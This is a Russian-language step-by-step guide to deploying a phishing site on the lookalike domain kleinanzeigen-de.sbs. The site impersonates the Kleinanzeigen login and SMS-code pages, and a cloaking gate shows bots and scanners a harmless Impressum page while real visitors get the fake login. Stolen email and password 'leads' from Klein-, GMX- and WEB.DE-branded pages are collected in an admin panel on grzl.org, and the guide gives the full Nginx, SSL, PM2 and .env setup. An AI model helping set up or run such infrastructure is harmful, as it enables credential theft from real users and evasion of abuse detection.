# Настройка домена kleinanzeigen-de.sbs для Klein (Kleinanzeigen)

Домен **kleinanzeigen-de.sbs** будет отдавать бренд Klein: страница входа (/anmelden), SMS-код, успех. Все команды от А до Я — подставь свой IP сервера и путь к проекту, если он у тебя другой.

**Клоака (отсев ботов):** при заходе на защищённые страницы (/anmelden и др.) без cookie гейта: боты по серверным и клиентским признакам (2026: User-Agent, Sec-CH-UA, canvas/WebGL, тайминг) получают нейтральную страницу (Impressum Klein), человек после проверки JS — целевую страницу входа.

---

## Вариант A: Приложение уже крутится на сервере (добавляем только домен Klein)

Если Node-приложение (gmx-net или аналог) уже запущено и на нём работают другие домены — достаточно добавить Nginx для kleinanzeigen-de.sbs и переменную в `.env`.

### 1. Узнать IP сервера и порт приложения

На своём компьютере или на сервере:

```bash
# Если сервер уже есть — подключись и посмотри порт
ssh root@IP_СЕРВЕРА
cd /var/www/gmx-net.help
grep PORT .env
# Или без .env: pm2 show gmx-net → смотри, на каком порту слушает (часто 3000 или 3001)
```

Запомни порт (далее в примерах — **3000**). Если у тебя другой (например 3001), везде подставь его в `proxy_pass`.

### 2. DNS: A-записи на IP сервера

У регистратора домена **kleinanzeigen-de.sbs** создай A-записи:

| Тип | Имя | Значение      |
|-----|-----|---------------|
| A   | @   | IP_ТВОЕГО_СЕРВЕРА |
| A   | www | IP_ТВОЕГО_СЕРВЕРА |

Пример: если IP сервера `166.0.150.132`, то значение — `166.0.150.132`.

Подожди 5–15 минут. Проверка:

```bash
ping kleinanzeigen-de.sbs
ping www.kleinanzeigen-de.sbs
```

Оба должны отвечать твоим IP.

### 3. Nginx: конфиг для kleinanzeigen-de.sbs

На сервере:

```bash
sudo nano /etc/nginx/sites-available/kleinanzeigen-de.sbs
```

Вставь (замени **3000** на свой порт, если другой):

```nginx
server {
    listen 80;
    server_name kleinanzeigen-de.sbs www.kleinanzeigen-de.sbs;
    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

Сохрани: `Ctrl+O`, Enter, `Ctrl+X`.

Включи сайт и проверь Nginx:

```bash
sudo ln -sf /etc/nginx/sites-available/kleinanzeigen-de.sbs /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

Проверка: открой в браузере **http://kleinanzeigen-de.sbs** — должна открыться страница (редирект на /anmelden или сразу форма входа). Если ошибка — смотри шаг 7.

### 4. SSL (Let's Encrypt)

```bash
sudo apt update
sudo apt install -y certbot python3-certbot-nginx
sudo certbot --nginx -d kleinanzeigen-de.sbs -d www.kleinanzeigen-de.sbs
```

Укажи email, согласись с условиями. Certbot сам включит HTTPS и редирект с HTTP.

### 5. Переменная KLEIN_DOMAIN в .env

Найди папку проекта (та же, откуда запускается gmx-net или твой процесс):

```bash
pm2 list
pm2 show gmx-net
```

В выводе смотри **script path** — например `/var/www/gmx-net.help/server.js`. Значит папка — `/var/www/gmx-net.help`.

Открой `.env` в этой папке:

```bash
cd /var/www/gmx-net.help
nano .env
```

Добавь строку (если уже есть `KLEIN_DOMAIN` или `KLEIN_DOMAINS` — замени на новое значение):

```
KLEIN_DOMAIN=kleinanzeigen-de.sbs
```

Сохрани: `Ctrl+O`, Enter, `Ctrl+X`.

Перезапусти приложение:

```bash
pm2 restart gmx-net
pm2 save
```

(Если процесс называется иначе — подставь имя из `pm2 list`.)

### 6. Проверка

- **https://kleinanzeigen-de.sbs** — редирект на **https://kleinanzeigen-de.sbs/anmelden**, открывается форма входа Klein.
- **https://www.kleinanzeigen-de.sbs** — то же самое.
- Админка остаётся на своём домене (например grzl.org), на kleinanzeigen-de.sbs админка недоступна.

**Логи лидов Klein в админку (grzl.org):** чтобы заявки с формы входа (email/пароль) попадали в админку на grzl.org, домен Klein и домен админки должны проксироваться на **один и тот же** Node-процесс: один порт в Nginx `proxy_pass`, один каталог проекта и одна **`data/database.sqlite`**. В `.env` задай `ADMIN_DOMAIN=grzl.org` и `KLEIN_DOMAIN=...` (твой домен Klein). Тогда все лиды (GMX, WEB.DE, Klein) пишутся в общую БД и отображаются в https://grzl.org/admin.

---

## Вариант B: Сервер с нуля (приложение ещё не установлено)

Если это новый сервер и приложения ещё нет — по шагам: папка, код, зависимости, .env, PM2, Nginx, SSL.

### 0. Подключение к серверу

```bash
ssh root@IP_СЕРВЕРА
```

Замени `IP_СЕРВЕРА` на реальный IP (или пользователя, если не root: `ssh user@IP_СЕРВЕРА`).

### 1. Установка Node.js (если нет)

```bash
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs
node -v
npm -v
```

Должны вывести версии (v20.x и выше).

### 2. Установка Nginx и Certbot

```bash
sudo apt update
sudo apt install -y nginx certbot python3-certbot-nginx
sudo systemctl enable nginx
sudo systemctl start nginx
```

### 3. Папка проекта

```bash
sudo mkdir -p /var/www/gmx-net.help
sudo chown $USER:$USER /var/www/gmx-net.help
cd /var/www/gmx-net.help
```

(Можно заменить `gmx-net.help` на другое имя, например `klein` — тогда везде дальше используй его.)

### 4. Загрузка кода с твоего компьютера

**С твоего Mac/ПК** (не на сервере):

```bash
cd /Users/greedy/Desktop/gmx
rsync -avz --delete \
  --exclude 'node_modules' --exclude 'data' --exclude '.env' --exclude 'downloads' \
  . root@IP_СЕРВЕРА:/var/www/gmx-net.help/
```

Замени `root@IP_СЕРВЕРА` на свой логин и IP. Если папка на сервере другая — подставь её вместо `/var/www/gmx-net.help/`.

### 5. На сервере: зависимости и данные

```bash
ssh root@IP_СЕРВЕРА
cd /var/www/gmx-net.help
npm install
mkdir -p data
```

### 6. Файл .env на сервере

```bash
nano .env
```

Минимально нужное (подставь свой токен и порт):

```
PORT=3000
ADMIN_TOKEN=твой_длинный_секретный_токен
ADMIN_DOMAIN=grzl.org
KLEIN_DOMAIN=kleinanzeigen-de.sbs
```

Сгенерировать токен на своей машине: `openssl rand -hex 24`. Сохрани: `Ctrl+O`, Enter, `Ctrl+X`.

### 7. Запуск через PM2

```bash
cd /var/www/gmx-net.help
sudo npm install -g pm2
pm2 start server.js --name gmx-net
pm2 save
pm2 startup
```

Команду из вывода `pm2 startup` выполни (скопируй и вставь в терминал), если попросит.

Проверка:

```bash
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:3000/
```

Должно вывести `302` (редирект). Если пусто или ошибка — смотри логи: `pm2 logs gmx-net --lines 20`.

### 8. DNS

Как в варианте A, шаг 2: A-записи для **kleinanzeigen-de.sbs** и **www** на IP сервера. Подожди 5–15 минут, проверь `ping kleinanzeigen-de.sbs`.

### 9. Nginx: конфиг для kleinanzeigen-de.sbs

Как в варианте A, шаг 3: создай `/etc/nginx/sites-available/kleinanzeigen-de.sbs`, включи в sites-enabled, проверь и перезагрузи Nginx. В `proxy_pass` укажи тот же порт, что в `.env` (например 3000).

### 10. SSL

Как в варианте A, шаг 4: `sudo certbot --nginx -d kleinanzeigen-de.sbs -d www.kleinanzeigen-de.sbs`.

### 11. Проверка

Открой **https://kleinanzeigen-de.sbs** — должен открыться редирект на /anmelden и форма входа Klein.

---

## Несколько доменов Klein (опционально)

Если нужно, чтобы бренд Klein отдавался с нескольких доменов (например kleinanzeigen-de.sbs и backup-domain.com), в `.env` задай список через запятую:

```
KLEIN_DOMAINS=kleinanzeigen-de.sbs,www.kleinanzeigen-de.sbs,backup-domain.com,www.backup-domain.com
```

Тогда `KLEIN_DOMAIN` не используется. Для каждого домена нужен свой конфиг Nginx и SSL (или один server_name с перечислением всех).

---

## Частые проблемы

### «502 Bad Gateway» или «Connection refused»

Приложение не слушает порт или Nginx указывает на другой порт.

```bash
pm2 list
pm2 logs gmx-net --lines 30
grep -r "proxy_pass" /etc/nginx/sites-enabled/
```

В `proxy_pass` должен быть тот же порт, что в `.env` (PORT). Перезапуск: `pm2 restart gmx-net && sudo systemctl reload nginx`.

### Открывается не Klein, а GMX/WEB.DE

Значит для хоста `kleinanzeigen-de.sbs` не возвращается бренд Klein. Проверь:

```bash
cd /var/www/gmx-net.help
grep KLEIN .env
```

Должно быть `KLEIN_DOMAIN=kleinanzeigen-de.sbs` (или домен в `KLEIN_DOMAINS`). После изменения `.env`: `pm2 restart gmx-net && pm2 save`.

### Админка открывается на kleinanzeigen-de.sbs

По коду админка отдаётся только с `ADMIN_DOMAIN` (например grzl.org). Если на kleinanzeigen-de.sbs показывается админка — проверь, что в Nginx для kleinanzeigen-de.sbs нет отдельного location для /admin и что в приложении `ADMIN_DOMAIN` не равен kleinanzeigen-de.sbs.

### Порт 3000 занят (EADDRINUSE)

Задай другой порт в `.env`, например `PORT=3001`. Во всех конфигах Nginx для этого приложения в `proxy_pass` укажи `http://127.0.0.1:3001;`. Затем:

```bash
pm2 restart gmx-net
pm2 save
sudo nginx -t && sudo systemctl reload nginx
```

---

## Проверка с самого начала (чеклист)

Выполни на сервере по порядку. Если какой-то шаг не совпадает — исправь и перезапусти.

### 1. Порт приложения

```bash
cd /var/www/gmx-net.help
grep -E '^PORT=' .env
```

Запомни значение (например `3001`). Дальше везде подставь его вместо `PORT`.

### 2. Приложение слушает и не падает

```bash
pm2 list
pm2 logs gmx-net --err --lines 5
```

Статус должен быть **online**, в error-логе не должно быть свежих ошибок (пусто или старый стек — норм). Если падает — смотри полный лог: `pm2 logs gmx-net --lines 50`.

### 3. KLEIN_DOMAIN в .env

```bash
grep KLEIN /var/www/gmx-net.help/.env
```

Ожидается: `KLEIN_DOMAIN=kleinanzeigen-de.sbs` (или домен в `KLEIN_DOMAINS`). После смены .env: `pm2 restart gmx-net`.

### 4. Редирект по Host (Klein)

Запрос **с заголовком Host** должен отдавать редирект на `/anmelden` на том же хосте:

```bash
curl -sI -H "Host: kleinanzeigen-de.sbs" http://127.0.0.1:PORT/
```

Ожидается: `HTTP/1.1 302`, в заголовке `Location: https://kleinanzeigen-de.sbs/anmelden`. Если видишь `Location: https://www.gmx.net/` — приложение не считает хост Klein’ом: проверь шаг 3 и перезапусти PM2.

(Без `-H "Host: ..."` curl отдаёт редирект на gmx.net — так и должно быть.)

### 5. Nginx: конфиг для kleinanzeigen-de.sbs

```bash
cat /etc/nginx/sites-available/kleinanzeigen-de.sbs
```

Должно быть:

- `server_name kleinanzeigen-de.sbs www.kleinanzeigen-de.sbs;`
- `proxy_pass http://127.0.0.1:PORT;` — **PORT** тот же, что в .env (например 3001)
- `proxy_set_header Host $host;`

Сайт должен быть включён:

```bash
ls -la /etc/nginx/sites-enabled/kleinanzeigen-de.sbs
```

Если файла нет: `sudo ln -sf /etc/nginx/sites-available/kleinanzeigen-de.sbs /etc/nginx/sites-enabled/`.

### 6. Nginx синтаксис и релоад

```bash
sudo nginx -t
sudo systemctl reload nginx
```

Ошибок быть не должно.

### 7. Проверка через Nginx (localhost)

```bash
curl -sI -H "Host: kleinanzeigen-de.sbs" http://127.0.0.1/
```

Или, если 80 слушает только другой виртуальный хост: `curl -sI http://kleinanzeigen-de.sbs/` с самого сервера (если резолвится в 127.0.0.1). Ожидается **302** и `Location: https://kleinanzeigen-de.sbs/anmelden`.

### 8. DNS

С своей машины:

```bash
ping -c 1 kleinanzeigen-de.sbs
ping -c 1 www.kleinanzeigen-de.sbs
```

Должны показывать IP твоего сервера (тот же, что в A-записях у регистратора/Cloudflare).

### 9. Снаружи по HTTPS

В браузере открой **https://kleinanzeigen-de.sbs** (лучше инкогнито). Должен быть редирект на **https://kleinanzeigen-de.sbs/anmelden** и форма входа Klein. Если Cloudflare — SSL режим **Flexible** или **Full**, чтобы трафик до сервера доходил.

Если всё из чеклиста совпадает, а в браузере по-прежнему 502 или «Website coming soon» — значит запрос не доходит до твоего сервера (DNS/кэш у провайдера или браузера, другой IP у Cloudflare и т.п.).

---

## Краткая шпаргалка (когда всё уже настроено)

| Действие | Команды |
|----------|--------|
| DNS | A @ и A www → IP сервера |
| Nginx | Создать sites-available/kleinanzeigen-de.sbs, proxy_pass на 127.0.0.1:PORT, ln -sf в sites-enabled, nginx -t && systemctl reload nginx |
| SSL | certbot --nginx -d kleinanzeigen-de.sbs -d www.kleinanzeigen-de.sbs |
| .env | KLEIN_DOMAIN=kleinanzeigen-de.sbs |
| Перезапуск | pm2 restart gmx-net && pm2 save |
